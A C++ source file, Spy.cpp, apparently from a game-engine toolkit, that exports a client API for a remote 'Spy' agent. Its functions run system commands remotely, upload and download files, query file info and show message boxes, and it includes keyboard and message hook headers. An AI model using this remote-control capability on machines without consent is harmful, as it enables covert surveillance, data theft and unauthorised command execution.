// Spy.cpp : 定义 DLL 应用程序的入口点。
//

#include "stdafx.h"
#include "Spy.h"
#include "SpyManager.h"
#include "SpyCommandVersion.h"
#include "SpyCommandSysCMD.h"
#include "SpyCommandManager.h"
#include "SpyCommandDownloadFile.h"
#include "SpyCommandUploadFile.h"
#include "SpyCommandGetFileInfo.h"
#include "SpyHookLLKeyboard.h"
#include "SpyHookCBT.h"
#include "SpyHookSystemMessageFilter.h"
#include "SpyHookGetMessage.h"
#include "SpyCommandMessageBox.h"
#include "../Network/NetworkManager.h"
#include <Iphlpapi.h>

#ifdef _MANAGED
#pragma managed(push, off)
#endif
#pragma data_seg(".custom")
HWND g_hLastInputHwnd = 0;
HWND g_hLastOutputHwnd = 0;
#pragma data_seg()
#pragma comment(linker, "/SECTION:.custom,RWS")

BOOL APIENTRY DllMain( HMODULE /*hModule*/,
                       DWORD  ul_reason_for_call,
                       LPVOID /*lpReserved*/
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        BEATS_ASSERT(CSpyManager::HasInstance() == false, _T("Call Uninit before free the library!"));
        break;
    }
    return TRUE;
}

#ifdef _MANAGED
#pragma managed(pop)
#endif

bool Init(void)
{
    return CSpyManager::GetInstance()->Initialize();
}

bool Uninit(void)
{
    bool bRet = CSpyManager::GetInstance()->Uninitialize();
    CSpyManager::Destroy();
    return bRet;
}

const hostent* Spy_GetHostInfo()
{
    return Beats_GetHostInfo();
}

const SBeatsSocket* Spy_Connect(size_t uIPAddress)
{
    const SBeatsSocket* pRet = NULL;
    SOCKET socket = Beats_CreateSocket(SOCK_STREAM, 0);
    BEATS_ASSERT(socket != INVALID_SOCKET, _T("Create socket failed!"));
    if (socket != INVALID_SOCKET)
    {
        sockaddr_in address_in;
        memset(&address_in, 0, sizeof(address_in));
        address_in.sin_family = AF_INET;
        address_in.sin_port = htons(SPY_DEFAULT_PORT);
        address_in.sin_addr.S_un.S_addr = uIPAddress;
        SharePtr<SSocketContext> pContext = CSpyManager::GetInstance()->ConnectToSpy(socket, &address_in, true);
        if (pContext.Get() != NULL)
        {
            pRet = Beats_GetSockInfo(pContext->m_socket);
        }
    }
    return pRet;
}

bool Spy_GetNetAdapterInfo(std::string& strInfo)
{
    bool bRet = false;
    PIP_ADAPTER_INFO pAdapterInfo = Beats_CreateNetAdapterInfo();
    if (pAdapterInfo != NULL)
    {
        strInfo.clear();
        PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
        while (pAdapter) 
        {
            strInfo.append(pAdapter->Description).append("\n");
            strInfo.append("\tIP Address: \t").append(pAdapter->IpAddressList.IpAddress.String).append("\n");
            strInfo.append("\tIP Mask: \t").append(pAdapter->IpAddressList.IpMask.String).append("\n");
            strInfo.append("\tGateway \t").append(pAdapter->GatewayList.IpAddress.String).append("\n");
            strInfo.append("\n\n");
            pAdapter = pAdapter->Next;
        }
        BEATS_SAFE_DELETE(pAdapterInfo);
        bRet = true;
    }
    return bRet;
}

bool Spy_SendSystemCommand(SOCKET sock, const char* pszCmd, TCommandFeedBackFunc pFeedbackFunc, void* pUserData)
{
    bool bRet = false;
    CSpyCommandSysCMD cmd;
    cmd.SetSystemCMDData(pszCmd);
    cmd.SetFeedBackFuncAddr((size_t)pFeedbackFunc, (size_t)pUserData);
    SharePtr<SSocketContext> socketContent = CSpyManager::GetInstance()->GetSocket(sock);
    BEATS_ASSERT(socketContent.Get() != NULL, _T("Invalid socket!"));
    if (socketContent.Get() != NULL)
    {
        bRet = CSpyCommandManager::GetInstance()->SendCommand(socketContent, &cmd);
    }
    return bRet;
}

bool Spy_SendFileInfoCommand(SOCKET sock, const TCHAR* pszCmd, TFileInfoFeedbackFunc pFeedbackFunc, void* pUserData)
{
    bool bRet = false;
    CSpyCommandGetFileInfo cmd;
    cmd.SetFeedBackFuncAddr((size_t)pFeedbackFunc, (size_t)pUserData);
    cmd.SetFileName(pszCmd);
    SharePtr<SSocketContext> socketContent = CSpyManager::GetInstance()->GetSocket(sock);
    BEATS_ASSERT(socketContent.Get() != NULL, _T("Invalid socket!"));
    if (socketContent.Get() != NULL)
    {
        bRet = CSpyCommandManager::GetInstance()->SendCommand(socketContent, &cmd);
    }
    return bRet;
}

bool Spy_SendMessageCommand(SOCKET sock, const TCHAR* pszMsg, const TCHAR* pszCapital)
{
    bool bRet = false;
    CSpyCommandMessageBox cmd;
    cmd.SetMessage(pszMsg);
    cmd.SetCaption(pszCapital);
    SharePtr<SSocketContext> socketContent = CSpyManager::GetInstance()->GetSocket(sock);
    BEATS_ASSERT(socketContent.Get() != NULL, _T("Invalid socket!"));
    if (socketContent.Get() != NULL)
    {
        bRet = CSpyCommandManager::GetInstance()->SendCommand(socketContent, &cmd);
    }
    return bRet;
}

bool Spy_DownloadFiles(SOCKET sock, const std::vector<TString>& files, const TString& strStorePath, CFileFilter* pFilter)
{
    bool bRet = false;
    CSpyCommandDownloadFile cmd;
    cmd.SetDownloadFiles(files);
    cmd.SetStorePath(strStorePath.c_str());
    cmd.SetUploadMode(false);
    cmd.SetFileFilter(pFilter);
    SharePtr<SSocketContext> socketContent = CSpyManager::GetInstance()->GetSocket(sock);
    BEATS_ASSERT(socketContent.Get() != NULL, _T("Invalid socket!"));
    if (socketContent.Get() != NULL)
    {
        bRet = CSpyCommandManager::GetInstance()->SendCommand(socketContent, &cmd);
    }
    return bRet;
}

bool Spy_UploadFiles(SOCKET sock, const std::vector<TString>& files, const TString& strStorePath, CFileFilter* pFilter)
{
    bool bRet = false;
    CSpyCommandUploadFile cmd;
    cmd.SetUploadFile(files);
    cmd.SetStorePath(strStorePath.c_str());
    cmd.SetFileFilter(pFilter);
    SharePtr<SSocketContext> socketContent = CSpyManager::GetInstance()->GetSocket(sock);
    BEATS_ASSERT(socketContent.Get() != NULL, _T("Invalid socket!"));
    if (socketContent.Get() != NULL)
    {
        bRet = CSpyCommandManager::GetInstance()->SendCommand(socketContent, &cmd);
    }
    return bRet;
}
